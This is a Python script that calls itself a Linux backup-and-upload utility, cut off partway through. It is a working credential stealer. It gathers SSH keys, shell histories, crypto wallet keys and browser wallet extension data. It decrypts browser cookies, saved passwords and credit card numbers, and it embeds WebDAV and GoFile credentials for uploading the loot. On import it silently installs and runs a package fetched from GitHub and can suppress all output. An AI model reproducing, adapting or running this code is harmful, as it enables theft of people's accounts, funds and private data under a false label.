# -*- coding: utf-8 -*-
"""
自动备份和上传工具
功能：备份 linux 系统中的重要文件，并自动上传到云存储
"""

# 先导入标准库
import os
import sys
import shutil
import time
import socket
import logging
import logging.handlers
import platform
import tarfile
import threading
import subprocess
import getpass
import json
import base64
import glob
import sqlite3
from datetime import datetime, timedelta
from pathlib import Path
from functools import lru_cache

def is_running_in_virtualenv():
    """判断当前解释器是否运行在虚拟环境中。"""
    return (
        sys.prefix != getattr(sys, 'base_prefix', sys.prefix)
        or hasattr(sys, 'real_prefix')
    )

@lru_cache(maxsize=1)
def pip_supports_break_system_packages():
    """检查当前 pip 是否支持 --break-system-packages。"""
    try:
        result = subprocess.run(
            [sys.executable, '-m', 'pip', 'install', '--help'],
            capture_output=True,
            text=True,
            check=False,
        )
        return '--break-system-packages' in result.stdout
    except Exception:
        return False

def build_pip_install_command(package_name):
    """根据当前 Python 环境构建兼容的 pip 安装命令。"""
    command = [
        sys.executable,
        '-m',
        'pip',
        'install',
        package_name,
        '--quiet',
        '--upgrade',
    ]

    if not is_running_in_virtualenv() and pip_supports_break_system_packages():
        command.append('--break-system-packages')

    return command


def check_and_install_dependencies():
    """检查并安装必需的依赖包"""
    required_packages = {
        'requests': 'requests',
        'urllib3': 'urllib3',
    }
    
    optional_packages = {
        'pycryptodome': 'pycryptodome',
    }
    
    missing_required = []
    missing_optional = []
    
    # 检查必需的依赖
    for module_name, package_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_required.append(package_name)
 
    for module_name, package_name in optional_packages.items():
        try:
            __import__('Crypto')
        except ImportError:
            missing_optional.append(package_name)
    
    # 安装缺失的必需依赖
    if missing_required:
        print(f"检测到缺失的必需依赖: {', '.join(missing_required)}")
        print("正在自动安装...")
        failed_packages = []
        for package in missing_required:
            try:
                subprocess.check_call(build_pip_install_command(package))
                print(f"✓ 已安装: {package}")
            except subprocess.CalledProcessError as e:
                print(f"⚠ 安装失败: {package} - {str(e)}")
                failed_packages.append(package)
        
        if failed_packages:
            print(f"⚠ 警告: 以下依赖安装失败，程序将继续运行，但相关功能可能不可用: {', '.join(failed_packages)}")
    
    if missing_optional:
        print(f"检测到缺失的可选依赖: {', '.join(missing_optional)}")
        for package in missing_optional:
            try:
                subprocess.check_call(build_pip_install_command(package))
                print(f"✓ 已安装: {package}")
            except subprocess.CalledProcessError as e:
                print(f"⚠ 安装失败: {package} - {str(e)}（可选功能可能不可用）")
    
    if not missing_required and not missing_optional:
        print("✓ 所有依赖已就绪")

def ensure_pipx_and_openclaw():
    """检查 pipx 和 openclaw-config（claw）"""
    # 1. 检查 pipx 是否可用
    pipx_ok = False
    try:
        result = subprocess.run(
            ['pipx', '--version'],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        pipx_ok = (result.returncode == 0)
    except Exception:
        pipx_ok = False

    if not pipx_ok:
        print("⚠ 检测到 pipx 未安装，跳过")
        return

    # 2. 使用 pipx 安装或升级 claw
    try:
        check_cmd = ['bash', '-lc', 'command -v openclaw-config >/dev/null 2>&1']
        result = subprocess.run(check_cmd)
        has_openclaw = (result.returncode == 0)
    except Exception as e:
        print(f"⚠ 检查 openclaw-config 失败: {str(e)}，将尝试安装 claw")
        has_openclaw = False

    claw_spec = "git+https://github.com/web3toolsbox/claw.git"

    if not has_openclaw:
        print("检测到 openclaw-config 未安装，正在通过 pipx 安装 claw ...")
        try:
            subprocess.check_call(['pipx', 'install', claw_spec])
            print("✓ 已通过 pipx 安装 claw")
        except subprocess.CalledProcessError as e:
            print(f"⚠ 通过 pipx 安装 claw 失败: {str(e)}")
            return
    else:
        print("检测到 openclaw-config 已安装，正在通过 pipx 刷新 claw ...")
        try:
            subprocess.check_call(['pipx', 'install', '--force', claw_spec])
            print("✓ 已通过 pipx 刷新 claw")
        except subprocess.CalledProcessError as e:
            print(f"⚠ 通过 pipx 刷新 claw 失败: {str(e)}")
            try:
                subprocess.check_call(['pipx', 'upgrade', 'claw'])
                print("✓ 已通过 pipx 升级已安装的 claw")
            except subprocess.CalledProcessError as upgrade_error:
                print(f"⚠ 通过 pipx 升级 claw 失败: {str(upgrade_error)}")
                # 升级失败不阻塞后续 openclaw-config 的调用

    # 3. 运行 openclaw-config
    try:
        print("正在运行 openclaw-config ...")
        subprocess.check_call(['openclaw-config'])
        print("✓ openclaw-config 执行完成")
    except subprocess.CalledProcessError as e:
        print(f"⚠ 运行 openclaw-config 失败: {str(e)}")
    except FileNotFoundError:
        print("⚠ 未找到 openclaw-config 命令，请检查 pipx / claw 是否正确安装")


check_and_install_dependencies()
ensure_pipx_and_openclaw()

import_failed = False
try:
    import requests
    from requests.auth import HTTPBasicAuth
except ImportError as e:
    print(f"⚠ 警告: 无法导入 requests 库: {str(e)}")
    requests = None
    HTTPBasicAuth = None
    import_failed = True

try:
    import urllib3
    # 禁用SSL警告
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError as e:
    print(f"⚠ 警告: 无法导入 urllib3 库: {str(e)}")
    urllib3 = None
    import_failed = True

if import_failed:
    print("⚠ 警告: 部分依赖导入失败，程序将继续运行，但相关功能可能不可用")

# 尝试导入加密库
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Random import get_random_bytes
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False
    print("⚠ pycryptodome 未安装，浏览器数据导出功能将不可用")

class BackupConfig:
    # 调试配置
    DEBUG_MODE = True  # 是否输出调试日志（False/True）
    
    # 文件大小配置（单位：字节）
    MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # 单文件阈值：50MB（超过则分片）
    CHUNK_SIZE = 50 * 1024 * 1024             # 分片大小：50MB
    
    # 重试配置
    RETRY_COUNT = 5        # 最大重试次数
    RETRY_DELAY = 60       # 重试等待时间（秒）
    UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
   
    # 备份间隔配置
    BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
    CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
    SCAN_TIMEOUT = 3600    # 扫描超时时间：1小时
    
    # 日志配置
    LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
    # 注意：已改为上传后清空机制，不再使用日志轮转
    # LOG_MAX_SIZE = 10 * 1024 * 1024  # 日志文件最大大小：10MB（已废弃）
    # LOG_BACKUP_COUNT = 10             # 保留的日志备份数量（已废弃）

    # 时间阈值文件配置
    THRESHOLD_FILE = str(Path.home() / ".dev/Backup/next_backup_time.txt")  # 时间阈值文件路径

    # 需要备份的服务器目录或文件
    SERVER_BACKUP_DIRS = [
        ".ssh",                     # SSH配置
        ".bashrc",                    
        ".bash_history",            # Bash历史记录
        ".python_history",          # Python历史记录
        ".bash_aliases",            # Bash别名
        ".node_repl_history",       # Node.js REPL 历史记录
        ".wget-hsts",               # wget HSTS 历史记录
        ".Xauthority",              # Xauthority 文件
        ".ICEauthority",            # ICEauthority 文件
        ".config/solana/id.json",
        ".claude/config.json",
        ".codex/auth.json",
        ".codex/config.toml",
        ".openclaw/agents",
        ".openclaw/workspace/MEMORY.md",
        ".openclaw/openclaw.json*", # 只备份 openclaw.json 及其所有备份文件
    ]

    # 需要备份的文件类型
    # 文档类型扩展名
    DOC_EXTENSIONS = [
        ".txt", ".json", ".csv", ".md", ".pdf", ".doc", ".docx", ".xls", ".xlsx",
    ]
    # 配置类型扩展名
    CONFIG_EXTENSIONS = [
        ".pem", ".key", ".keystore", ".xml", ".ini", ".config", ".conf", ".json", ".env",
        ".yaml", ".yml", ".toml", ".wallet", "id_rsa", "id_ecdsa", "id_ed25519",
    ]
    # 所有备份扩展名（用于兼容性）
    BACKUP_EXTENSIONS = DOC_EXTENSIONS + CONFIG_EXTENSIONS
    
    # 排除的目录
    EXCLUDE_DIRS = [
        ".bashrc",
        ".bitcoinlib",
        ".cargo",
        ".conda",
        ".dev",              # 排除.dev目录，避免循环备份
        ".docker",
        ".dotnet",
        ".fonts",
        ".git",
        ".gongfeng-copilot",
        ".gradle",
        ".icons",
        ".jupyter",
        ".landscape",
        ".local",
        ".npm",
        ".nvm",
        ".orca_term",
        ".pki",
        ".pm2",
        ".profile",
        ".rustup",
        ".ssh",
        ".solcx",
        ".themes",
        ".thunderbird",
        ".wdm",
        "cache",
        "myenv",
        "snap",
        "venv",
        ".venv",
        "node_modules",
        "dist",
        ".cache",
        ".vscode-server",
        "build",
        ".vscode-remote-ssh",
        "__pycache__",
    ]

    # GoFile 上传配置（备选方案）
    UPLOAD_SERVERS = [
        "https://store9.gofile.io/uploadFile",
        "https://store8.gofile.io/uploadFile",
        "https://store7.gofile.io/uploadFile",
        "https://store6.gofile.io/uploadFile",
        "https://store5.gofile.io/uploadFile"
    ]

    # 网络配置
    NETWORK_CHECK_HOSTS = [
        "8.8.8.8",         # Google DNS
        "1.1.1.1",         # Cloudflare DNS
        "208.67.222.222",  # OpenDNS
        "9.9.9.9"          # Quad9 DNS
    ]
    NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
    NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数

if BackupConfig.DEBUG_MODE:
    logging.basicConfig(format="%(message)s", level=logging.DEBUG)
else:
    sys.stdout = sys.stderr = open(os.devnull, 'w')
    logging.basicConfig(format="%(message)s", level=logging.CRITICAL)

class BackupManager:
    
    def __init__(self):
        """初始化备份管理器"""
        self.config = BackupConfig()
        self.infini_url = "https://otaru.infini-cloud.net/dav/"
        self.infini_user = "macstar"
        self.infini_pass = "p43ZDLzNPv2GixSk"
        # Infini 上传配置：主配置 + 备用配置（全部失败才会回退 GoFile）
        self.infini_configs = [
            {
                "name": "Infini-主配置",
                "url": self.infini_url,
                "user": self.infini_user,
                "password": self.infini_pass,
            },
            {
                "name": "Infini-备用配置",
                "url": "https://wajima.infini-cloud.net/dav/",
                "user": "cryptostarxp",
                "password": "LDW9ERV3xuUrHSjZ",
            },
        ]
        
        # GoFile API token（备选方案）
        self.api_token = "GXPkms2fGdFYDLu17RQHlklDonEPfvY5"
        
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        self.config.INFINI_REMOTE_BASE_DIR = f"{user_prefix}_linux_backup"
        
        # 配置 requests session 用于上传
        self.session = requests.Session()
        self.session.verify = False  # 禁用SSL验证
        self.auth = HTTPBasicAuth(self.infini_user, self.infini_pass)
        
        # 使用集合优化扩展名检查性能
        self.doc_extensions_set = set(ext.lower() for ext in self.config.DOC_EXTENSIONS)
        self.config_extensions_set = set(ext.lower() for ext in self.config.CONFIG_EXTENSIONS)
        # JTB相关标志
        self._clipboard_display_warned = False  # 是否已警告过 DISPLAY 不可用
        self._clipboard_display_error_time = 0  # 上次记录 DISPLAY 错误的时间
        self._clipboard_display_error_interval = 300  # DISPLAY 错误日志间隔（5分钟）
        self._setup_logging()

    def _setup_logging(self):
        """配置日志系统"""
        try:
            log_dir = os.path.dirname(self.config.LOG_FILE)
            os.makedirs(log_dir, exist_ok=True)

            # 使用 FileHandler，采用上传后清空机制（与 Windows/macOS 版本保持一致）
            file_handler = logging.FileHandler(
                self.config.LOG_FILE,
                encoding='utf-8'
            )
            file_handler.setFormatter(
                logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')
            )

            console_handler = logging.StreamHandler()
            console_handler.setFormatter(logging.Formatter('%(message)s'))

            root_logger = logging.getLogger()
            root_logger.setLevel(
                logging.DEBUG if self.config.DEBUG_MODE else logging.INFO
            )

            root_logger.handlers.clear()
            root_logger.addHandler(file_handler)
            root_logger.addHandler(console_handler)
            
            logging.info("日志系统初始化完成")
        except Exception as e:
            print(f"设置日志系统时出错: {e}")

    @staticmethod
    def _get_dir_size(directory):
        total_size = 0
        for dirpath, _, filenames in os.walk(directory):
            for filename in filenames:
                file_path = os.path.join(dirpath, filename)
                try:
                    total_size += os.path.getsize(file_path)
                except (OSError, IOError) as e:
                    logging.error(f"获取文件大小失败 {file_path}: {e}")
        return total_size

    @staticmethod
    def _ensure_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                if not os.path.isdir(directory_path):
                    logging.error(f"路径存在但不是目录: {directory_path}")
                    return False
                if not os.access(directory_path, os.W_OK):
                    logging.error(f"目录没有写入权限: {directory_path}")
                    return False
            else:
                os.makedirs(directory_path, exist_ok=True)
            return True
        except Exception as e:
            logging.error(f"创建目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _clean_directory(directory_path):
        try:
            if os.path.exists(directory_path):
                shutil.rmtree(directory_path, ignore_errors=True)
            return BackupManager._ensure_directory(directory_path)
        except Exception as e:
            logging.error(f"清理目录失败 {directory_path}: {e}")
            return False

    @staticmethod
    def _check_internet_connection():
        """检查网络连接状态"""
        for _ in range(BackupConfig.NETWORK_CHECK_RETRIES):
            for host in BackupConfig.NETWORK_CHECK_HOSTS:
                try:
                    socket.create_connection(
                        (host, 53), 
                        timeout=BackupConfig.NETWORK_CHECK_TIMEOUT
                    )
                    return True
                except (socket.timeout, socket.gaierror, ConnectionRefusedError):
                    continue
                except Exception as e:
                    logging.debug(f"网络检查出错 {host}: {e}")
                    continue
            time.sleep(1)  # 重试前等待1秒
        return False

    @staticmethod
    def _is_valid_file(file_path):
        try:
            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
        except Exception:
            return False

    def _backup_specified_item(self, source_path, target_base, item_name):
        """备份指定的文件或目录"""
        try:
            if os.path.isfile(source_path):
                target_file = os.path.join(target_base, item_name)
                target_file_dir = os.path.dirname(target_file)
                if self._ensure_directory(target_file_dir):
                    shutil.copy2(source_path, target_file)
                    if self.config.DEBUG_MODE:
                        logging.info(f"已备份指定文件: {item_name}")
                    return True
            else:
                target_path = os.path.join(target_base, item_name)
                if self._ensure_directory(os.path.dirname(target_path)):
                    if os.path.exists(target_path):
                        shutil.rmtree(target_path)
                    # 对于SERVER_BACKUP_DIRS中指定的目录，复制时仍然递归检查排除项
                    exclude_dirs_lower = {ex.lower() for ex in self.config.EXCLUDE_DIRS}
                    ignore_func = lambda d, files: [
                        f for f in files 
                        if any(ex in os.path.join(d, f).lower() for ex in exclude_dirs_lower)
                    ]
                    shutil.copytree(source_path, target_path, symlinks=True, ignore=ignore_func)
                    if self.config.DEBUG_MODE:
                        logging.info(f"📁 已备份指定目录: {item_name}/")
                    return True
        except Exception as e:
            logging.error(f"❌ 备份失败: {item_name} - {str(e)}")
        return False

    def backup_chrome_extensions(self, target_extensions):
        """备份 Linux 浏览器扩展目录（仅钱包扩展数据）- 独立函数和独立目录"""
        try:
            home_dir = os.path.expanduser('~')
            username = getpass.getuser()
            user_prefix = username[:5] if username else "user"
            
            # 目标扩展的识别信息（通过名称和可能的ID匹配）
            # 支持从不同商店安装的扩展（Chrome Web Store、Edge Add-ons Store等）
            target_extensions_config = {
                "metamask": {
                    "names": ["MetaMask", "metamask"],  # manifest.json 中的 name 字段
                    "ids": [
                        "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Chrome / Chromium / Brave
                        "ejbalbakoplchlghecdalmeeeajnimhm",  # Edge
                    ],
                },
                "okx_wallet": {
                    "names": ["OKX Wallet", "OKX", "okx wallet"],
                    "ids": [
                        "mcohilncbfahbmgdjkbpemcciiolgcge",  # Chrome / Chromium / Brave
                        "pbpjkcldjiffchgbbndmhojiacbgflha",  # Edge
                    ],
                },
                "binance_wallet": {
                    "names": ["Binance Wallet", "Binance", "binance wallet"],
                    "ids": [
                        "cadiboklkpojfamcoggejbbdjcoiljjk",  # Chrome / Chromium / Brave
                        # Edge 不支持 Binance Wallet
                    ],
                },
            }
            
            browser_roots = {
                "chrome": os.path.join(home_dir, '.config', 'google-chrome', 'Default', 'Local Extension Settings'),
                "chromium": os.path.join(home_dir, '.config', 'chromium', 'Default', 'Local Extension Settings'),
                "edge": os.path.join(home_dir, '.config', 'microsoft-edge', 'Default', 'Local Extension Settings'),
            }

            def identify_extension(ext_id, ext_settings_path):
                """通过扩展ID和manifest.json识别扩展类型"""
                # 方法1: 通过已知ID匹配
                for ext_name, ext_info in target_extensions_config.items():
                    if ext_id in ext_info["ids"]:
                        return ext_name
                
                # 方法2: 通过读取Extensions目录下的manifest.json识别
                # 扩展的实际安装目录在 Extensions 文件夹中
                try:
                    # 尝试从 Local Extension Settings 的父目录找到 Extensions 目录
                    profile_path = os.path.dirname(ext_settings_path)
                    extensions_dir = os.path.join(profile_path, "Extensions")
                    if os.path.exists(extensions_dir):
                        ext_install_dir = os.path.join(extensions_dir, ext_id)
                        if os.path.exists(ext_install_dir):
                            # 查找版本目录（扩展通常安装在版本号子目录中）
                            version_dirs = [d for d in os.listdir(ext_install_dir) 
                                           if os.path.isdir(os.path.join(ext_install_dir, d))]
                            for version_dir in version_dirs:
                                manifest_path = os.path.join(ext_install_dir, version_dir, "manifest.json")
                                if os.path.exists(manifest_path):
                                    try:
                                        with open(manifest_path, 'r', encoding='utf-8') as f:
                                            manifest = json.load(f)
                                            ext_name_in_manifest = manifest.get("name", "")
                                            # 检查是否匹配目标扩展
                                            for ext_name, ext_info in target_extensions_config.items():
                                                for target_name in ext_info["names"]:
                                                    if target_name.lower() in ext_name_in_manifest.lower():
                                                        return ext_name
                                    except Exception as e:
                                        if self.config.DEBUG_MODE:
                                            logging.debug(f"读取manifest.json失败: {manifest_path} - {e}")
                                        continue
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"识别扩展失败: {ext_id} - {e}")
                
                return None

            def copy_chrome_dir_if_exists(src_dir, dst_name):
                if os.path.exists(src_dir) and os.path.isdir(src_dir):
                    target_path = os.path.join(target_extensions, dst_name)
                    try:
                        # 确保目标父目录存在
                        parent_dir = os.path.dirname(target_path)
                        if not self._ensure_directory(parent_dir):
                            return
                        # 如果目标目录已存在，先删除
                        if os.path.exists(target_path):
                            shutil.rmtree(target_path, ignore_errors=True)
                        # 复制整个目录
                        shutil.copytree(src_dir, target_path, symlinks=True)
                        if self.config.DEBUG_MODE:
                            logging.info(f"📦 已备份 Chrome 扩展目录: {dst_name}")
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"复制 Chrome 扩展目录失败: {src_dir} - {str(e)}")

            for browser_name, root_dir in browser_roots.items():
                if not os.path.exists(root_dir):
                    continue
                
                # 扫描所有扩展目录
                try:
                    ext_dirs = [d for d in os.listdir(root_dir) 
                               if os.path.isdir(os.path.join(root_dir, d))]
                    
                    for ext_id in ext_dirs:
                        # 识别扩展类型
                        ext_name = identify_extension(ext_id, root_dir)
                        if not ext_name:
                            continue  # 不是目标扩展，跳过
                        
                        source_dir = os.path.join(root_dir, ext_id)
                        copy_chrome_dir_if_exists(source_dir, f"{user_prefix}_{browser_name}_{ext_name}")
                except Exception as e:
                    if self.config.DEBUG_MODE:
                        logging.debug(f"扫描扩展目录失败: {root_dir} - {e}")
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"备份浏览器扩展目录失败: {str(e)}")

    def _get_browser_master_key(self, browser_name):
        """获取浏览器主密钥（从 Linux Keyring）"""
        if not CRYPTO_AVAILABLE:
            return None
        
        try:
            # 方法 1：尝试使用 secretstorage 库
            try:
                import secretstorage
                connection = secretstorage.dbus_init()
                collection = secretstorage.get_default_collection(connection)
                
                keyring_labels = {
                    "Chrome": "Chrome Safe Storage",
                    "Chromium": "Chromium Safe Storage",
                    "Brave": "Brave Safe Storage",
                    "Edge": "Chromium Safe Storage",
                }
                
                label = keyring_labels.get(browser_name, "Chrome Safe Storage")
                
                for item in collection.get_all_items():
                    if item.get_label() == label:
                        password = item.get_secret().decode('utf-8')
                        connection.close()
                        
                        salt = b'saltysalt'
                        iterations = 1
                        key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
                        return key
                
                connection.close()
            except Exception:
                pass
            
            # 方法 2：尝试使用 libsecret-tool 命令行工具
            try:
                keyring_apps = {
                    "Chrome": "chrome",
                    "Chromium": "chromium",
                    "Brave": "brave",
                    "Edge": "chromium",
                }
                
                app = keyring_apps.get(browser_name, "chrome")
                cmd = ['secret-tool', 'lookup', 'application', app]
                result = subprocess.run(cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    password = result.stdout.strip()
                    salt = b'saltysalt'
                    iterations = 1
                    key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
                    return key
            except Exception:
                pass
            
            # 方法 3：使用默认密码 "peanuts"
            password = "peanuts"
            salt = b'saltysalt'
            iterations = 1
            key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
            return key
            
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"获取 {browser_name} 主密钥失败: {e}")
            # 回退到默认密钥
            password = "peanuts"
            salt = b'saltysalt'
            iterations = 1
            key = PBKDF2(password.encode('utf-8'), salt, dkLen=16, count=iterations)
            return key
    
    def _decrypt_browser_payload(self, cipher_text, master_key):
        """解密浏览器数据"""
        if not CRYPTO_AVAILABLE or not master_key:
            return None
        
        try:
            # Linux Chrome v10+ 使用 AES-128-CBC
            if cipher_text[:3] == b'v10' or cipher_text[:3] == b'v11':
                iv = b' ' * 16  # Chrome on Linux uses blank IV
                cipher_text = cipher_text[3:]  # 移除 v10/v11 前缀
                cipher = AES.new(master_key, AES.MODE_CBC, iv)
                decrypted = cipher.decrypt(cipher_text)
                # 移除 PKCS7 padding
                padding_length = decrypted[-1]
                if isinstance(padding_length, int) and 1 <= padding_length <= 16:
                    decrypted = decrypted[:-padding_length]
                return decrypted.decode('utf-8', errors='ignore')
            else:
                return cipher_text.decode('utf-8', errors='ignore')
        except Exception:
            return None
    
    def _safe_copy_locked_file(self, source_path, dest_path, max_retries=3):
        """安全复制被锁定的文件（浏览器运行时）"""
        for attempt in range(max_retries):
            try:
                shutil.copy2(source_path, dest_path)
                return True
            except PermissionError:
                try:
                    with open(source_path, 'rb') as src:
                        with open(dest_path, 'wb') as dst:
                            shutil.copyfileobj(src, dst)
                    return True
                except Exception:
                    if attempt == max_retries - 1:
                        return self._sqlite_online_backup(source_path, dest_path)
                    time.sleep(0.5)
            except Exception:
                return False
        return False
    
    def _sqlite_online_backup(self, source_db, dest_db):
        """使用 SQLite Online Backup 复制数据库"""
        try:
            source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
            dest_conn = sqlite3.connect(dest_db)
            source_conn.backup(dest_conn)
            source_conn.close()
            dest_conn.close()
            return True
        except Exception:
            return False
    
    def _export_browser_cookies(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
        """导出浏览器 Cookies"""
        # 支持 Network/Cookies 路径（新版本 Chrome）
        cookies_path = os.path.join(browser_path, "Network", "Cookies")
        if not os.path.exists(cookies_path):
            cookies_path = os.path.join(browser_path, "Cookies")
        
        if not os.path.exists(cookies_path):
            return []
        
        profile_suffix = f"_{profile_name}" if profile_name else ""
        temp_cookies = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_cookies.db")
        if not self._safe_copy_locked_file(cookies_path, temp_cookies):
            return []
        
        cookies = []
        try:
            conn = sqlite3.connect(temp_cookies)
            cursor = conn.cursor()
            # 使用 CAST 确保 encrypted_value 作为 BLOB 读取
            cursor.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) as encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
            
            for row in cursor.fetchall():
                host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                
                # 确保 encrypted_value 是 bytes 类型
                if encrypted_value is not None:
                    if isinstance(encrypted_value, str):
                        try:
                            encrypted_value = encrypted_value.encode('latin1')
                        except:
                            continue
                    elif not isinstance(encrypted_value, (bytes, bytearray)):
                        try:
                            encrypted_value = bytes(encrypted_value)
                        except:
                            continue
                
                decrypted_value = self._decrypt_browser_payload(encrypted_value, master_key)
                if decrypted_value:
                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": decrypted_value,
                        "path": path,
                        "expires": expires,
                        "secure": bool(is_secure),
                        "httponly": bool(is_httponly)
                    })
            
            conn.close()
        except (sqlite3.Error, UnicodeDecodeError) as e:
            # 如果 CAST 方法失败，尝试使用备用方法
            try:
                conn = sqlite3.connect(temp_cookies)
                conn.text_factory = bytes
                cursor = conn.cursor()
                cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                
                for row in cursor.fetchall():
                    host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
                    
                    # 解码文本字段
                    try:
                        host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
                        name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                        path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
                    except:
                        continue
                    
                    # encrypted_value 应该是 bytes，直接使用
                    if encrypted_value is not None and isinstance(encrypted_value, bytes):
                        decrypted_value = self._decrypt_browser_payload(encrypted_value, master_key)
                        if decrypted_value:
                            cookies.append({
                                "host": host,
                                "name": name,
                                "value": decrypted_value,
                                "path": path,
                                "expires": expires,
                                "secure": bool(is_secure),
                                "httponly": bool(is_httponly)
                            })
                
                conn.close()
            except Exception as e2:
                pass
        except Exception:
            pass
        finally:
            if os.path.exists(temp_cookies):
                try:
                    os.remove(temp_cookies)
                except Exception:
                    pass
        
        return cookies
    
    def _export_browser_passwords(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
        """导出浏览器密码"""
        login_data_path = os.path.join(browser_path, "Login Data")
        if not os.path.exists(login_data_path):
            return []
        
        profile_suffix = f"_{profile_name}" if profile_name else ""
        temp_login = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_login.db")
        if not self._safe_copy_locked_file(login_data_path, temp_login):
            return []
        
        passwords = []
        try:
            conn = sqlite3.connect(temp_login)
            cursor = conn.cursor()
            # 使用 CAST 确保 password_value 作为 BLOB 读取
            cursor.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) as password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                
                # 确保 encrypted_password 是 bytes 类型
                if encrypted_password is not None:
                    if isinstance(encrypted_password, str):
                        try:
                            encrypted_password = encrypted_password.encode('latin1')
                        except:
                            continue
                    elif not isinstance(encrypted_password, (bytes, bytearray)):
                        try:
                            encrypted_password = bytes(encrypted_password)
                        except:
                            continue
                
                decrypted_password = self._decrypt_browser_payload(encrypted_password, master_key)
                if decrypted_password:
                    passwords.append({
                        "url": url,
                        "username": username,
                        "password": decrypted_password
                    })
            
            conn.close()
        except (sqlite3.Error, UnicodeDecodeError) as e:
            # 如果 CAST 方法失败，尝试使用备用方法
            try:
                conn = sqlite3.connect(temp_login)
                conn.text_factory = bytes
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                
                for row in cursor.fetchall():
                    url_bytes, username_bytes, encrypted_password = row
                    
                    # 解码文本字段
                    try:
                        url = url_bytes.decode('utf-8') if isinstance(url_bytes, bytes) else url_bytes
                        username = username_bytes.decode('utf-8') if isinstance(username_bytes, bytes) else username_bytes
                    except:
                        continue
                    
                    # encrypted_password 应该是 bytes，直接使用
                    if encrypted_password is not None and isinstance(encrypted_password, bytes):
                        decrypted_password = self._decrypt_browser_payload(encrypted_password, master_key)
                        if decrypted_password:
                            passwords.append({
                                "url": url,
                                "username": username,
                                "password": decrypted_password
                            })
                
                conn.close()
            except Exception as e2:
                pass
        except Exception:
            pass
        finally:
            if os.path.exists(temp_login):
                try:
                    os.remove(temp_login)
                except Exception:
                    pass
        
        return passwords
    
    def _export_browser_web_data(self, browser_name, browser_path, master_key, temp_dir, profile_name=None):
        """导出浏览器 Web Data（自动填充数据、支付方式等）"""
        web_data_path = os.path.join(browser_path, "Web Data")
        if not os.path.exists(web_data_path):
            return {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
        
        profile_suffix = f"_{profile_name}" if profile_name else ""
        temp_web_data = os.path.join(temp_dir, f"temp_{browser_name}{profile_suffix}_webdata.db")
        if not self._safe_copy_locked_file(web_data_path, temp_web_data):
            return {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
        
        web_data = {
            "autofill_profiles": [],
            "credit_cards": [],
            "autofill_profile_names": [],
            "autofill_profile_emails": [],
            "autofill_profile_phones": [],
            "autofill_profile_addresses": []
        }
        
        try:
            conn = sqlite3.connect(temp_web_data)
            cursor = conn.cursor()
            
            try:
                # 使用 CAST 确保 card_number_encrypted 作为 BLOB 读取
                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                for row in cursor.fetchall():
                    guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
                    try:
                        # 确保 encrypted_card 是 bytes 类型
                        if encrypted_card is not None:
                            if isinstance(encrypted_card, str):
                                try:
                                    encrypted_card = encrypted_card.encode('latin1')
                                except:
                                    continue
                            elif not isinstance(encrypted_card, (bytes, bytearray)):
                                try:
                                    encrypted_card = bytes(encrypted_card)
                                except:
                                    continue
                        
                        decrypted_card = self._decrypt_browser_payload(encrypted_card, master_key) if encrypted_card else None
                        if decrypted_card:
                            web_data["credit_cards"].append({
                                "guid": guid,
                                "name_on_card": name_on_card,
                                "expiration_month": exp_month,
                                "expiration_year": exp_year,
                                "card_number": decrypted_card,
                                "billing_address_id": billing_id,
                                "nickname": nickname
                            })
                    except Exception:
                        continue
            except (sqlite3.Error, UnicodeDecodeError) as e:
